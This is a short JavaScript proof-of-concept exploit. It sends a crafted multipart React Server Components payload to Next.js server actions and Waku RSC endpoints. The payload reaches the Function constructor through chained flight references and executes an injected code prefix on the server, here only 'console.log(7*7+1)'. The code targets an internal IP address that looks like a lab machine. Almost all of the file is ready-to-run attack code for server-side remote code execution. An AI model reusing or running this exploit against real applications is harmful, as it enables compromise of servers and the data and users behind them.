const payload = {
    '0': '$1',
    '1': {
        'status':'resolved_model',
        'reason':0,
        '_response':'$4',
        'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
        'then':'$2:then'
    },
    '2': '$@3',
    '3': [],
    '4': {
        '_prefix':'console.log(7*7+1)//',
        '_formData':{
            'get':'$3:constructor:constructor'
        },
        '_chunks':'$2:_response:_chunks',
    }
}


const FormDataLib = require('form-data')

const fd = new FormDataLib()

for (const key in payload) {
    fd.append(key, JSON.stringify(payload[key]))
}

console.log(fd.getBuffer().toString())

console.log(fd.getHeaders())

function exploitNext(baseUrl) {
    fetch(baseUrl, {
        method: 'POST',
        headers: {
            'next-action': 'x',
            ...fd.getHeaders()
        },
        body: fd.getBuffer()
    }).then(x => {
        console.log('fetched', x)
        return x.text()
    }).then(x => {
        console.log('got', x)
    })
}

function exploitWaku(baseUrl) {
    fetch(baseUrl + '/RSC/foo.txt', {
        method: 'POST',
        headers: fd.getHeaders(),
        body: fd.getBuffer()
    }).then(x => {
        console.log('fetched', x)
        return x.text()
    }).then(x => {
        console.log('got', x)
    })
}

// Place the correct URL and uncomment the line
// exploitNext('http://localhost:3003')
exploitWaku('http://10.129.3.227:3000')
